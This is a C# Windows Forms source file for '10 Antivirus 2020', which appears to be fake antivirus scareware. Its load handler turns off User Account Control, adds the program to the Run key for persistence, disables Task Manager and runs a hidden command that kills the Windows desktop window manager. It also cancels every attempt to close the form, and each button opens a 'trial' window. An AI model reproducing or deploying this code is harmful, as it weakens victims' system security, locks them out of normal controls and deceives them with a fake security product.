﻿using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.IO;
using System.Windows.Forms;

namespace _10_Antivirus_2020
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg.SetValue("FilterAdministratorToken", 1, RegistryValueKind.DWord);
            RegistryKey reg2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg2.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey reg3 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg3.SetValue("10 Antivirus 2020", Application.ExecutablePath.ToString());
            RegistryKey reg4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            reg4.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);

            ProcessStartInfo kokot = new ProcessStartInfo();
            kokot.FileName = "cmd.exe";
            kokot.WindowStyle = ProcessWindowStyle.Hidden;
            kokot.Arguments = @"/k taskkill /f /im dwm.exe";
            Process.Start(kokot);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            MessageBox.Show("There is no way to close it", "10 Antivirus 2020", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var NewForm = new Trial_Window();
            NewForm.ShowDialog();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            var NewForm = new Trial_Window();
            NewForm.ShowDialog();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            var NewForm = new Trial_Window();
            NewForm.ShowDialog();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var NewForm = new Trial_Window();
            NewForm.ShowDialog();
        }
    }
}
